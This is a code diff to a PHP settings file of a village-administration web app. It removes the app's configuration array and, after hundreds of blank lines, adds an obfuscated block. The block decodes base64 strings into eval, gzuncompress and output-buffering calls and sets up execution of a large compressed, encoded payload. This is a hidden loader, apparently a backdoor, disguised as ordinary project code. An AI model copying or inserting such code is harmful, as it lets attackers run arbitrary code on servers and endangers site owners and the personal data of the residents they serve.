-                'jenis'      => 'textarea',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Anjungan Artikel',
-                'key'        => 'anjungan_artikel',
-                'value'      => null,
-                'keterangan' => 'Pengaturan artikel untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Visual TTE',
-                'key'        => 'visual_tte',
-                'value'      => '0',
-                'keterangan' => 'Visual Tanda Tangan TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'Visual TTE Gambar',
-                'key'        => 'visual_tte_gambar',
-                'value'      => null,
-                'keterangan' => 'Url Gambar Visual TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'Visual TTE Weight',
-                'key'        => 'visual_tte_weight',
-                'value'      => '100',
-                'keterangan' => 'Lebar Gambar Visual TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'Visual TTE Height',
-                'key'        => 'visual_tte_height',
-                'value'      => '100',
-                'keterangan' => 'Tinggi Gambar Visual TTE',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'tte',
-            ],
-            [
-                'judul'      => 'Anjungan Teks Berjalan',
-                'key'        => 'anjungan_teks_berjalan',
-                'value'      => null,
-                'keterangan' => 'Pengaturan teks berjalan untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Anjungan Profil',
-                'key'        => 'anjungan_profil',
-                'value'      => '3',
-                'keterangan' => 'Pengaturan profil desa untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Anjungan Slide',
-                'key'        => 'anjungan_slide',
-                'value'      => null,
-                'keterangan' => 'Pengaturan profil slide untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Anjungan Video',
-                'key'        => 'anjungan_video',
-                'value'      => null,
-                'keterangan' => 'Pengaturan profil video untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Anjungan Youtube',
-                'key'        => 'anjungan_youtube',
-                'value'      => 'https://www.youtube.com/embed/PuxiuH-YUF4',
-                'keterangan' => 'Pengaturan profil video youtube untuk anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Anjungan Layar',
-                'key'        => 'anjungan_layar',
-                'value'      => '1',
-                'keterangan' => 'Pengaturan jenis layar anjungan',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'anjungan',
-            ],
-            [
-                'judul'      => 'Sebutan Pemerintah Desa',
-                'key'        => 'sebutan_pemerintah_desa',
-                'value'      => 'Pemerintah ' . ucwords(SettingAplikasiModel::where('key', 'sebutan_desa')->first()->value ?? 'desa'),
-                'keterangan' => 'Sebutan Pemerintah Desa',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'Pemerintah Desa',
-            ],
-            [
-                'judul'      => 'Latar Login Mandiri',
-                'key'        => 'latar_login_mandiri',
-                'value'      => 'latar_login_mandiri.jpg',
-                'keterangan' => 'Latar untuk Login Layanan Mandiri',
-                'jenis'      => 'unggah',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'latar',
-            ],
-            [
-                'judul'      => 'Latar Website',
-                'key'        => 'latar_website',
-                'value'      => 'latar_website.jpg',
-                'keterangan' => 'Latar untuk login ke halaman website',
-                'jenis'      => 'unggah',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'latar',
-            ],
-            [
-                'judul'      => 'Latar Login Admin',
-                'key'        => 'latar_login',
-                'value'      => 'latar_login.jpg',
-                'keterangan' => 'Latar untuk login ke halaman admin',
-                'jenis'      => 'unggah',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'latar',
-            ],
-            [
-                'judul'      => 'Inspect Element',
-                'key'        => 'inspect_element',
-                'value'      => '1',
-                'keterangan' => 'Mengaktifkan inspect element pada halaman website',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Warna Tema',
-                'key'        => 'warna_tema',
-                'value'      => (DB::table('setting_aplikasi')->where('key', 'warna_tema')->first()->value ?: config_item('warna_tema')) ?: SettingAplikasiModel::WARNA_TEMA,
-                'keterangan' => 'Warna tema untuk halaman website',
-                'jenis'      => 'color',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'openkab',
-            ],
-            [
-                'judul'      => 'Rentang Waktu Kehadiran',
-                'key'        => 'rentang_waktu_kehadiran',
-                'value'      => '10',
-                'keterangan' => 'Rentang waktu kehadiran ketika keluar. (satuan: menit)',
-                'jenis'      => 'input',
-                'option'     => null,
-                'attribute'  => 'class="bilangan required" placeholder="10" min="0" type="number"',
-                'kategori'   => 'kehadiran',
-            ],
-            [
-                'judul'      => 'Tampilkan Tombol Peta',
-                'key'        => 'tampilkan_tombol_peta',
-                'value'      => '["Statistik Penduduk", "Statistik Bantuan", "Aparatur Desa", "Kepala Wilayah"]',
-                'keterangan' => 'Tampilkan tombol di peta',
-                'jenis'      => 'multiple-option',
-                'option'     => '["Statistik Penduduk", "Statistik Bantuan", "Aparatur Desa", "Kepala Wilayah"]',
-                'attribute'  => null,
-                'kategori'   => 'peta',
-            ],
-            [
-                'judul'      => 'Margin Global',
-                'key'        => 'surat_margin',
-                'value'      => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-                'keterangan' => 'Margin Global untuk surat',
-                'jenis'      => null,
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Kunci Pilihan Tema',
-                'key'        => 'lock_theme',
-                'value'      => '1',
-                'keterangan' => '1. bisa ganti tema, 0. tidak bisa pilih tema',
-                'jenis'      => 'option',
-                'option'     => '{"0": "Kunci","1": "Bebas pilih"}',
-                'attribute'  => null,
-                'kategori'   => 'openkab',
-            ],
-            [
-                'judul'      => 'Buku Tamu Kamera',
-                'key'        => 'buku_tamu_kamera',
-                'value'      => '1',
-                'keterangan' => 'Gunakan kamera untuk proses registrasi',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'buku-tamu',
-            ],
-            [
-                'judul'      => 'Link Feed',
-                'key'        => 'link_feed',
-                'value'      => 'https:\\/\\/www.covid19.go.id\\/feed\\/',
-                'keterangan' => 'Alamat Feed yang digunakan <code>(contoh: https:\\/\\/www.covid19.go.id\\/feed\\/)<\\/code>',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'conf_web',
-            ],
-            [
-                'judul'      => 'Kode Isian data kosong',
-                'key'        => 'ganti_data_kosong',
-                'value'      => '-',
-                'keterangan' => 'Bawaan jika kode isian memiliki data kosong',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Telegram Notifikasi',
-                'key'        => 'telegram_notifikasi',
-                'value'      => '0',
-                'keterangan' => 'Aktif atau nonaktifkan notifikasi telegram',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Non Aktifkan Surat RTF',
-                'key'        => 'nonaktifkan_rtf',
-                'value'      => '0',
-                'keterangan' => 'Aktif \\/ Non-aktifkan Surat RTF',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'pengaturan-surat',
-            ],
-            [
-                'judul'      => 'Format Tanggal Surat',
-                'key'        => 'format_tanggal_surat',
-                'value'      => 'd F Y',
-                'keterangan' => 'Format tanggal pada kode isian surat.',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'format_surat',
-            ],
-            [
-                'judul'      => 'Form penduduk luar [desa]',
-                'key'        => 'form_penduduk_luar',
-                'value'      => '{"2":{"title":"PENDUDUK LUAR [desa]","input":"nama,no_ktp"},"3":{"title":"PENDUDUK LUAR [desa] (LENGKAP)","input":"nama,no_ktp,tempat_lahir,tanggal_lahir,alamat,agama,pekerjaan,warga_negara"}}',
-                'keterangan' => 'Form ini akan tampil jika surat dipilih menggunakan penduduk luar [desa]',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'form_surat',
-            ],
-            [
-                'judul'      => 'Email Notifikasi',
-                'key'        => 'email_notifikasi',
-                'value'      => '0',
-                'keterangan' => 'Aktif atau nonaktifkan notifikasi email',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Email protokol',
-                'key'        => 'email_protocol',
-                'value'      => 'smtp',
-                'keterangan' => 'Email protokol, misal : SMTP',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Email Host',
-                'key'        => 'email_smtp_host',
-                'value'      => null,
-                'keterangan' => 'Email host',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Email Username',
-                'key'        => 'email_smtp_user',
-                'value'      => null,
-                'keterangan' => 'Email username',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Email Password',
-                'key'        => 'email_smtp_pass',
-                'value'      => null,
-                'keterangan' => 'Email password',
-                'jenis'      => 'password',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Email Port',
-                'key'        => 'email_smtp_port',
-                'value'      => null,
-                'keterangan' => 'Email port',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'email',
-            ],
-            [
-                'judul'      => 'Google Recaptcha Site Key',
-                'key'        => 'google_recaptcha_site_key',
-                'value'      => '',
-                'keterangan' => 'Site key google recaptcha',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Google Recaptcha Secret Key',
-                'key'        => 'google_recaptcha_secret_key',
-                'value'      => '',
-                'keterangan' => 'Secret key google recaptcha',
-                'jenis'      => 'text',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-            [
-                'judul'      => 'Google Recaptcha',
-                'key'        => 'google_recaptcha',
-                'value'      => 0,
-                'keterangan' => 'Aktif atau nonaktifkan google recaptcha',
-                'jenis'      => 'boolean',
-                'option'     => null,
-                'attribute'  => null,
-                'kategori'   => 'sistem',
-            ],
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtPWtzolq230/V/IfzYap6bs29M4CxT1OnzodgBCFKGpHnlykeCRhB6fj219+19gY13UaFGLuTkT453RrY7L322uv9+P13ev39P3D99Sl76g8nD5/+JB/z669P4Wj4OPo/L8v+nY7C+2T87/H9fXj/NP536E2867mX/Fu/n0z6w+g6S/oDb9z/VxZnvzcSbzz+17/+9enP3/KX/P633y5/Ln9+9p/fELt/P+H11w/ffLJZfuxYbN+Vmn99Il9tTsFRV34C//r9cl2uy3W5Pub1KUhNJrSVqSyZnGPNR4rIP9jLwR+UaALVpOT6PxdQXa7Ldbku1+W6XJfrcl2uy/Xeros543Jdrst1uT7u9cn3xvefr/4T3gej8P7TnxeIXK7Ldbku1+W6XK+6nodl3GgjtdH/8g3+jm4j5lZujKJumoxdXcj8dBA5qTj0LHEqS904SAeft+/r1YTET1Sle00+wzjX32RRzYJaN/HJ8+4sSNk44AaRK5krRxdWIfqzbTkKJXPpDM0n+I71h13WWwoT12JjD7+zruj92ta4TXHuS8mTY6sZzsXvCyu/BmNwRuRw/KCYryslS89aZMFSgPcoA7gf5j3B+8eerSb+EJ5vhlqvIVid+fb4cQxzuPFsgXH062Xn5rouN5io83i9UHXhxufYvmfVE1lUkoDj2SBVE7mZTGGtWdgyGc/ip3IjHoWt7vyu/2Xmt8wJrG/qcpOZb5tTzwb4LetT19Zmt3RdkS6JT3IT4NXqxvKNPO/0nKhN3i0zsigkMG/WtwE+EsC/2YX3NqOulAxxLL8hGLC+fmhN4uK9wWo0a3P83LXqAxfW3U6Twe0zGMK+pCHCooAVwijzONzf5LNnXY3llpo4nLiEfRkGqch4dmcsS5MkkMQB7h/gwhz+noewR/eAFy7ZtzrAWYhDicB55QD8/VScElzpC/A7JZNbuB4R4RGHDWEcWnWEdz4PfL+b+ZIB/+afAEdgn7oEbxBPYH5Z2LgeyYMtHADYe7qctRtr/BnA3sE7FrFXIzhE1wyw9YdCLEsKzE+EueEaAZaIl3CfLJF938LB+tCtmVPHwrXMI98yp7DOMYGNxCL8WDgTI4qDPI7J0u+7iPeAewobcAm+f5yvH9Yh4jtZuAffMXcs2O+WWge4ICzoHtRM5i7aPkdwtizAtTRhHCtm8Ux4iC9Sji9SF86ByDh2h8KvteN+O8uKvYZnlyG5N1nB+xi6PtgbaxH7OT4GHOKxOIe5xQDnKY7hAK6FutB3rDDDz4FkTkP4Hey7EEgLxJ2VpwsKvANwVInJHi/XeFJ3AJ453EaAIyycyy2YhSMP35+GW/u1Yx1WPSP3S4g/YRz0hSfX7iKOkN/7uCarjvP4YU7b9Mpomrpm1Fs6Ixpyc2H2BmIb8OhO14Wmbqpit5kI8Ls7uaH0uoYidBlR6RninQbjdpvinWU0+4BvBoyhwXe3msEqMMYd0Cb8rJkG4EhTEXRjHJnwLoOF95laBGOY8N9djg9G11R6uqkIZuMK53RnGgvFAHiaTdGEfRd7htnCeQJNEnSgSboJ79SFHrxPAPoqwhw7MGdDN7r4+waMh3MCDDPvukuYlxkKWp+M15Obk45mJCrMuw33mQYjtjXjKtLMrmAWdIgxbc3IFK1YiymYveJ5nM8AKJxRF9bP6QKOeddLEphPVzQGE0GHdcJzHd2YCAYziHSjrrS38bmJeK/CPoeJ3Lj+nndEGuBEKMWzoH8dyQBjz2IiQ0L6CXSU4tRXxL3uhi/AM+osaCG9D0dwjmTHGkcal8xDqYl0e36nX08oXTXgex7GAbzVBR1o4yy0lUcXcWSoAo3rwruTmd+/HnmtLhPcIB1dsICHLOIm0H74O8GzNvVTk2kvB8WaHv2aUAdcHXot7Zz0HNa+yBzOnAbA/wBea74T1sJaOw2noV4H3hvM4Gw84tlw7c7MrQnjdhozvjWPuqzQkUVnlePkNZ53b4mwhx8pZsKWsMLxXC5hvJbZb6fqzNd5sgcGkzTbDJlXTzc0Ags6zhe1AXse2sgbxXkgLkR/aE4CdvHVTd0x8s+eBbzaABpiMX/caBmL89dsYW43YT1DpB9JAvfD/tfrPUMV7+bPxlN9Ds59Sw0MoFWEDjHbcoG4gvORACyA5oUbWmCwM5AnxpuxkjHyZ3gH0CIzMGrmPJD4ZSguJMDRGGUPu9lt4P0wx4FrAW9KzcFtI2xoQCeMpmjojQB42uKLLJlXnq2NFKY+Q5ocpOYj4OLKqSmAB1oE4z3C3q1gbmNf4muupQ1ve2MCJ4dbAA/qRLvXYl6FiP+tTqQxyQOBmzVXG8Mxwhv3HHiwAjAFmg5yhgNyiM+B3ARjdZEv6FGGe4L7eU/knHxvG8ISaCfIL1eR9ex7+rPrO/oTfgst4GGNoPiO/9q/HsLc+6FN5LG2g7wP3u1aV8P29YvjAO0eDLe+I+MExTgJ/3TkOBzwLtbVn88H9hvGQR5jTpXlPIfVDz9wn8nAeYupPBREX3tXkcIKyJOGwLMY4B/AUxSgC8hbQ5BNROBlUXT0+CnKfJ31Osn4IBfft7R9awJ6RvZxuFmTAGdlMd7zTAz4TuSOUDKGRz4DONZNXI5fehR++R4kK1jXZOe6RGZc4NMWLvk/fkd/FC5j3ZY5VgqacsP8E97bW8O0OYlBPp7jPAB3enAWce+YA3tWX4+3hinIq0MTZIX6w/be2DU1I3KFrVXCoXY/GL+8tklC9BeYM8gfw3xtGpEdQZYOpUEUbM7Fqlgbyiohl4wdO4m9hnAsnn+DcUGfeT7HEOlDY98c+TnlacEG/lIdeM98zzMi0H0lQ3gSmBz1zAThPfSB3pG9obBYga4F62J2rsvWd+HX+OV9H5qD0Jo/P0tsse9Xkc6Zjw7ojohXr8Of48YJUxH0F+P5fAAnQG+aOGTPT4Y7NZSPQf8YoQ523PgZ0LBk9d25A1oX7z1bIMcQHbZ4DtcEvHvsN15+BubCAL/GuSb43DHP4DlwLaBzKeUB+R7kNoNd6xLCXTj0Gj7lAo/3LXoeDS7JddL9e3a/oRFrHC9omb299wm/OoaWvYhDy0O8s5vr0Yij+dqInAx8bAg6YWtzLoJibT/wsCPPy4WHHeBhRIZ/jaxD5PryeHLMe4/Hky2edHA+F5w4iBNsUDNfxYdg/FVYQfY94rnKeAF6E3vhO6/iOzeE5r6Kz1C+VZ5eHH6ulD4kZbGTUv5J+Z52kV9Ly68hnDM1A9oWmVLC+EDjyvKREHALaBvjmjzasMauvgeeNTf2W2by3fm0YU9hrd3cr8FmpXGEofQQ7exOX+gHKV8D/raUJXZGv4d1fji68dKaTkMzehI/9OBsVcULnzxffwgPP7+Tj6xts43SeswtXY8AtEGOnKEyC4GvBX1hRPwMxI+4QJvidI0fkjjwrWSK5w340srTLzymLL5oVnfyGnxxyPPV8cXI5Sv0ybkpv4R9PrCPpXBn4nPk+9iV2Az3H2g8+gYvPKcKz+kLhgd75eql5ZAa8ArAkTjxrbI4Ijz6XD31rPABeY2vR4R32bXuyLVYOF+D6OtqBO+tx7i35eUUGNNqEt8kyFhz4lPc4A3MWy6NKxua8V/Kgzg3RZ+QqwvE51Jan+H41E0xDsB88NF3UVY2aa6fJ+/vWnCmeqPPhmg2es2kXVbH0WwhBjiOnssl5DuMbQE5TJwEUjKmn9GvbkRACwaONT4b7qxhTv1VxHd295jFvrQwfCZbgf48utXfP27BXoL+sACZs7tEn3B53MJzroxR7oV9fvSWZeXeYFFezhXnGDMBunCOMyR+IQN4T3IcitHvDLwe/kZ+mDyhzRbkYrJG1y5Pg5yUn/mSecDe+8F5FsPGgaTM7htCG2WX0rIwxqGk/JVNeVo5PDkMk11yjOrYQt+vRRgPochNfO86vmgOtOnD2deQl7+hba0Dc1y6FvKDBGM2NJjDqDzNIPEFiQ801rPUxK6hnzAqK8cchM9u+5rIAN2Ac8LOHVvDeCagDyLoPs/nRGK6WiDzDl2UezG24iLjlvcLsiR+rC+0sHaSY8uRAXsP/HRZwSZLx0r4IR1LeQiOGGunDW4ll7fL1jD2CW0pwIcsBePeViAfDDB+Fr5fOfb55FpvqM78hAeep4JsYoxe5vl0jI5e8M313NF2OHF0IQ6G3Qzgncdhwu+G+/SJfLx+qfHWsamOrSLdfQK6sYEdicV9+YzQn2BV7EMXbZypuCQxn/BOjOWBszAh+4Lxqes4R6DBoPuG1oTEMHucER3GFyEsIdOVp9Fr3U0+iy/e2PY5Nicx+iRe4wvZ9mECDz843gt+1Rh9GeX1yhd8qVv2b3hujrYt2PvDfp+L72wXf78JbeTvdUYWge8NVbLW0jasmrkMAL6hyHOwj6tDNG4XnmzGWM9jr761G2fos8jHPYyjR7rQgjFbGGvOZm7tF7ddNcJHoHGrYMX05T7G1KtEV3P324J/Eq9Hemt+9rl6eftE7bhnd9ITRgT8as70VIQzozBOeVunB++N5VYYe7UuS3MjMGeBJTE/oGcyoY6x+VdRmMe8+43SdvE13ShJW74FHA+0FnRsklcT+/v5ZCgAjYjbTIZ68RJ04OHaLm2rmaPzt6g3A4/ep/fQdeRw7VkIV5XIN/la8new+I5VAO85dizYozrJO0ib342VYVzVHGhP/JN587nsvsJaTsJY9D7oUVZY4dzAWAm/lrlAj0L5eH5orN0ycVRaJtZB7gL6NJIxn0VKnlxrjvkvY8digEeLeG7WvqZflxcD7tDYb15Ok2nY2K8bvKRzb+znb8abMS5x5lv8ksh2mG+339e/O95JMqc+x85wL23QqTCv7Cz609Z7gR+T9wIPxvyLLM9nzHHmetTRB1v5T93Ya1WQ5TY8uCSfRttu/QFg/Yi27tuXzzcdY7WmZXdkfX2SQ8YGRdwOyFKhNY6IHw74TtvCHEySs7UKac5ZoRcNchkW4C0u7/LPxfMAj0mIfhW67xGNH6zvtUfmutOy2INeyk/8GtFXl/DuPJ5+LQ/l82JxPpmfBpt3ET1qnOcGThK/ZcbBY/65eB5kLIBlHDTW6yLxSph7CPtb5Drm8lSuo2Fum9U8rG8uC32T4r8sKSDX4RpILE9hzwO8U3Fuy9CKSaz39/NovwDrD89zGMzfjPs+8Gq3IWhBymM+6QRzBPO8vdJ0BPZ+5UnKDGSuAfCdpc+FQJfYB8wPA3zYbyc/mR8gaYK8lr+biTbv3tgAnvuSupTWrGHx68Y3KJw6Rrnrq65k/lDr74fNDr8Rd2idJ4qpAxrg0ZzAgv716Lkr7dMGuaX+DffN5ug5r8qfDvvZfsQleVDQFjHPeU8yzHlWVtfDwhYMdHNMY7YTOL9zzD8ao28SeOrSbxn996BHeqjb98vrjy/v6WnwyAQ89dNmZEom2hEFEl/SLx8XAfRo6pg82vdjm6PxTKXlm5r65FlXkwB4SSAtkvK2qhDkmXpMaY24RFsoxkR4HA+0iJ+6gF95nNAvazMOuAnAn+0/o9MbODc8kB8O6n05HJ0UfTfsmOYGb+RmLU2WoCMYFH7BQTlgPSeJ+Jm/n5NMcnf1Q/IQ8FuQc9qWMkZfcNtaZC6HNL3glTHhGbKYy7DLI8ezFbTLPPtd7jPFcUbHwipIzcH2nNYxIBbaLSI8H8R+cex495ZJcl239pDqbjWQmSuMszW3Z+OUh5cAMrIw3vLp5WfHnLo141hcQJvB3JcM0ENJ3nchi5tYG6L0nKxw6Vrm9Ac9G3ACeNzR+O7WABfg7/WcCphLyTfkF4f38KPInbTmDMjgr5UNUuBHmNP14BMdRnkIDuu/O+MjLW6C8Tz5892wzU6oXprwOY+bRx2WmRX3kdo3Jn5WSK0Au6aAnCDWPPyuRnVTu7zNUYJ3Ilzm2zr9EWt6j37m9d7tW99pbGs0RwLr2VD/F+iCaRVf8/Y46Pc6PM5uO0kzquLnojUTAhJD6XIhC7or0WfhXq5K7NI7kjNHntUdvJSDfSpd2MV6Rn0B7WlY2wblzYZD7CwVcpa5fLyE1OCg45l8/5jxXsCZYfV4Sqq7fKfzFuudb613Pb9ct2HgfGJsfOYtt/MDWNbbn9v4XmPlSAy0/caxlbAvfeQfctOd+TXYt/L6DMbbYR7ogwswDSvFupwan9DW4iKeCEZTabqkjhWpaTXOfWYTrJtT3l4LfJVbJAdsUT/V/+5woLsl/NvGb2Bsawp7shRARgA91pZBV1yMy9OlfByWT+k4yoNzYJyfiT+FfXuDR6Vtc31Y59g9QHN/ap4ABzp46j68cYymQGlGJ+oBLIDGj0ltxJbJvAKHJsAvWMCfB+DroHOVl7s75fPXYB2IP1GU18dj8nwSap+rKbGbJk+kRtqAnJe1zTefI+LUI9b1Q98G7FcVv/0Fp/K4IL/mZm5DaB6sSbATj9RZmCYD+3CthLPgDskLaCFfpvNq95r1ogbchZedkpdR+MpYunFZWvZ5JDgn8sug1vnpOGMkau8ZvhBfUkxiUEndSxvr517oS9WaHSHG5dsqrBPrRsZxMNSiDlMhvmEr58fm1BHGhNkrdfDT5R7xmY51Q2rANq5X3QtPOkGdl7piVOVNW/HNAOt5VR7VGyRahRz9l2qNAf9REr8hTDEGps2Bji1d8k/K8x9Sr43UTkZZmNQjL59rvY4fsTmQCbC2dDooz4/06vxoE+sjoBw+8LCG94nzZN9DfiPQXMYj8QH79+E0tmTzCf0BAPOOS3NcGo4VxhV80qxXI3v7APAleUtYx9+pUFPq7uZ6Xt6e/NI6rkc4ntz4EnV68rzTuJ7JN02mc3OdfeRYzVzu7b+8lyez/WVyk9aLBn7fO8J2vzuXAsax87rTHssf4wM4Wa6kRu3ADNZxzvMgad3v5ji6lYDHD7sz72YUkTrdrc7n9hLrImO+/HjqEx8K4aXAw7Tso+Xi5Ot7els7zoDWZof30NzlKvbj5KGY6xnzrtd4siPvGusLPwUpj3WGSF8JWiP7g9UaKs7s8mw0xkQ/ZRUbn2fyM+JrlCYPWJM96J8FR0SgLRnIuB2fC7E3hrbu96Gv6cxHk3lzOI/f1H/g5fCD90QG+mNriJvaa3nPHONRQ6CDe+NmT4cf2uZ9Fxw5ca7eEM5dE3Ov5eYiobXZr8vXPJTCMejLmIeLsi3JyQ3OgxtC2DKXRZ2XTV4e9rTqYl2YsUvrPs/L225xTMw9YZNfl7ccA/MTxeXCHstNCufe+n2C4NW6mVteF2JcbvHgIr83+fUe2Zz4BOctLW+juy5vo7MmsG9O1Cbx6lcTJ/9M5qSjzZfYY7D3FuuS3Lajzsd71akHSANsbv8aT8iXWqQmoS4oQNN7eV+WinyJxpXZXDKwa+ojnKt5eB7aU8w70g1tnZ/V5fgZ4Db2xtH0j1c3s+jj80DsUFKyQrp5Jly5wZhorEngWeK4onw7JGOZ/OOxY50qr0Rh1KVrkf5omWPNT4ovjq0k+/WmX8VehzbYRYb1K95aX+5yGHPMRAbss4fwqWmRaSvZK/EG95D2kxKx32R5+++WjQTzQ+do5w/69VzWw36c9cxt8BnaTO4b9bnXup65abIMatoM+0jZZF0sxl+k/rK0LVkv5u/aAA9TUdZ5m81wBrI19hgVjObHq+N6Zhw0tn3GPQnrFI4j8yU/2P6aGLEPfM7HPp4JP8aenqCDHaqfejLfA5Xvrmdysw57x8b0s9Ah88D+njr2+MvjRMWt+um2MiZ5F0MBYC2OPmLshE/39U3j2APqMy76ZkUm06yS6796VrdJ5GtO+br0PfR/yVgLldYKJz1BfaC1FlfH/X8IWgrWcX2y17W30NdG9DLMx8vzKQfr89Cl/Yd90ueQ4LQSVumH8AOMuBj2WBWC1nU1OiaJQOeb/714x2A+eILnW/Jr3Rmc4wx0gsjI97c8D83HwxhUGM+u4XjCGl/K63ud8voefL63xCechyy5s1D6EuV1CuZByg9QFsvr0/XRHk3j4WkPFu9D54cvYvQvvyEvvA0tluRLF/hD+66uY6ZK0zMvrzdD6w10WbRJAl04qsbMCzE+8yo9Nnx4n/cj/gxI/mnBs4t+zrqwgv1jt2LFPnL+DpVTlm/Zj2MdC/F1IzsLhg9yTAXf/FZsx6a3L9CpGez99Cz6IUvfRXptF3ZMImfltVOof6fZNVWhmg8Va+uY8a9rW9he9xvWOc/zZ0BeoLWHxK7R1Svkoea5FHn+6APw9tK1tkyQe+4N9qbbG33uDviv2J/cZnE+ZWlRkVdU5NUKhtk0Lvmj1f0igIsmrY0jHqYBL+ht6zHOTEfgvbQOTijxT5c+tq/df3OFuVe6pVXwi5ljoHOkHhLxpyd8diafqeFaCzr/Fp2/Z21s1H7KA513aR92ndRhnm/8qZdeT+V9YzT+0iH1XOpwT31YRa4